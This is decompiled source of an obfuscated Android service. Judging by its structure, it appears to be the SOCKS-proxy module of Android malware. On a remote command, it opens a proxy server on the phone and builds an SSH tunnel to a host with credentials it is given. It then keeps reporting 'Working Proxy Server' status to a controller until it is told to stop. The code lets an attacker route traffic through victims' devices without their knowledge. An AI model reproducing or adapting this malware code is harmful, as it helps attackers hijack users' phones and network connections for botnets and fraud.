package wocwvy.czyxoxmbauu.slsa.kuv;

import android.app.IntentService;
import android.content.Intent;
import java.net.ServerSocket;
import java.util.concurrent.TimeUnit;
import wocwvy.czyxoxmbauu.slsa.C0020b;

/* JADX INFO: loaded from: classes.dex */
public class sfswwunyakpjr extends IntentService {

    /* JADX INFO: renamed from: a */
    C0020b f441a;

    public sfswwunyakpjr() {
        super("sfswwunyakpjr");
        this.f441a = new C0020b();
    }

    @Override // android.app.IntentService
    protected void onHandleIntent(Intent intent) {
        this.f441a.m250d(this, "socks", "");
        String stringExtra = intent.getStringExtra("host");
        String stringExtra2 = intent.getStringExtra("user");
        String stringExtra3 = intent.getStringExtra("pass");
        String stringExtra4 = intent.getStringExtra("port");
        Thread thread = new Thread(new Runnable() { // from class: wocwvy.czyxoxmbauu.slsa.kuv.sfswwunyakpjr.1
            @Override // java.lang.Runnable
            public void run() {
                try {
                    ServerSocket serverSocket = new ServerSocket(34500);
                    sfswwunyakpjr.this.f441a.m230a("ProxyServer", "Port=" + serverSocket.getLocalPort());
                    while (true) {
                        new Thread(new RunnableC0026a(serverSocket.accept())).start();
                    }
                } catch (Exception e) {
                    sfswwunyakpjr.this.f441a.m230a("PORTERROR", "ERROR");
                    e.printStackTrace();
                }
            }
        });
        thread.start();
        C0020b c0020b = this.f441a;
        C0020b.m219a(this, stringExtra, stringExtra2, stringExtra3, stringExtra4);
        this.f441a.m230a("START", "START SOCKS");
        do {
            try {
                TimeUnit.MILLISECONDS.sleep(8000L);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            C0020b c0020b2 = this.f441a;
            StringBuilder sb = new StringBuilder();
            sb.append("p=");
            sb.append(this.f441a.m242c(this.f441a.m264q(this) + "|Working Proxy Server, Connection: ssh -L " + stringExtra4 + ":127.0.0.1:" + stringExtra4 + " " + stringExtra2 + "@" + stringExtra));
            c0020b2.m235b(this, "4", sb.toString());
        } while (!this.f441a.m251e(this, "socks").equals("stop"));
        thread.join();
        stopSelf();
    }
}
